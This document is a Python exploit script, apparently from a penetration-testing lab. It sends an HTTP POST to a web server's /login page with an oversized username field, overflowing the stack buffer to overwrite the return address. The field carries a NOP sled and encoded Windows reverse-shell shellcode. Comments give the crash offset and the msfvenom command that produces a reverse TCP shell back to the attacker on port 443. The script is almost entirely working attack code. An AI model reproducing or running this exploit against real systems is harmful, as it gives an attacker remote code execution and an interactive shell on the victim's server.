#!/usr/bin/python
import socket
import sys

# msf-pattern_offset -l 800 -q 42306142 
# [*] Exact match at offset 780

try:
  server = sys.argv[1]
  port = 80
  size = 800

  filler = b"A" * 780
  eip = b"\x83\x0c\x09\x10"
  offset = b"C" * 4

  # bad char \x0a\x0x\0x25\x26\x2B\x3d
  # msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
    
  nops = b"\x90" * 10
  shellcode = bytearray(
  b"\xba\x36\xbd\x2f\xec\xdb\xd8\xd9\x74\x24\xf4\x5e\x31\xc9"
  b"\xb1\x52\x31\x56\x12\x83\xee\xfc\x03\x60\xb3\xcd\x19\x70"
  b"\x23\x93\xe2\x88\xb4\xf4\x6b\x6d\x85\x34\x0f\xe6\xb6\x84"
  b"\x5b\xaa\x3a\x6e\x09\x5e\xc8\x02\x86\x51\x79\xa8\xf0\x5c"
  b"\x7a\x81\xc1\xff\xf8\xd8\x15\xdf\xc1\x12\x68\x1e\x05\x4e"
  b"\x81\x72\xde\x04\x34\x62\x6b\x50\x85\x09\x27\x74\x8d\xee"
  b"\xf0\x77\xbc\xa1\x8b\x21\x1e\x40\x5f\x5a\x17\x5a\xbc\x67"
  b"\xe1\xd1\x76\x13\xf0\x33\x47\xdc\x5f\x7a\x67\x2f\xa1\xbb"
  b"\x40\xd0\xd4\xb5\xb2\x6d\xef\x02\xc8\xa9\x7a\x90\x6a\x39"
  b"\xdc\x7c\x8a\xee\xbb\xf7\x80\x5b\xcf\x5f\x85\x5a\x1c\xd4"
  b"\xb1\xd7\xa3\x3a\x30\xa3\x87\x9e\x18\x77\xa9\x87\xc4\xd6"
  b"\xd6\xd7\xa6\x87\x72\x9c\x4b\xd3\x0e\xff\x03\x10\x23\xff"
  b"\xd3\x3e\x34\x8c\xe1\xe1\xee\x1a\x4a\x69\x29\xdd\xad\x40"
  b"\x8d\x71\x50\x6b\xee\x58\x97\x3f\xbe\xf2\x3e\x40\x55\x02"
  b"\xbe\x95\xfa\x52\x10\x46\xbb\x02\xd0\x36\x53\x48\xdf\x69"
  b"\x43\x73\x35\x02\xee\x8e\xde\xed\x47\xbd\xe7\x86\x95\xbd"
  b"\x16\xec\x13\x5b\x72\x02\x72\xf4\xeb\xbb\xdf\x8e\x8a\x44"
  b"\xca\xeb\x8d\xcf\xf9\x0c\x43\x38\x77\x1e\x34\xc8\xc2\x7c"
  b"\x93\xd7\xf8\xe8\x7f\x45\x67\xe8\xf6\x76\x30\xbf\x5f\x48"
  b"\x49\x55\x72\xf3\xe3\x4b\x8f\x65\xcb\xcf\x54\x56\xd2\xce"
  b"\x19\xe2\xf0\xc0\xe7\xeb\xbc\xb4\xb7\xbd\x6a\x62\x7e\x14"
  b"\xdd\xdc\x28\xcb\xb7\x88\xad\x27\x08\xce\xb1\x6d\xfe\x2e"
  b"\x03\xd8\x47\x51\xac\x8c\x4f\x2a\xd0\x2c\xaf\xe1\x50\x5c"
  b"\xfa\xab\xf1\xf5\xa3\x3e\x40\x98\x53\x95\x87\xa5\xd7\x1f"
  b"\x78\x52\xc7\x6a\x7d\x1e\x4f\x87\x0f\x0f\x3a\xa7\xbc\x30"
  b"\x6f")

  shellcode += b"D" * (1500 - len(filler) - len(eip) - len(offset) - len(shellcode))

  inputBuffer = filler + eip + offset + nops + shellcode

  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
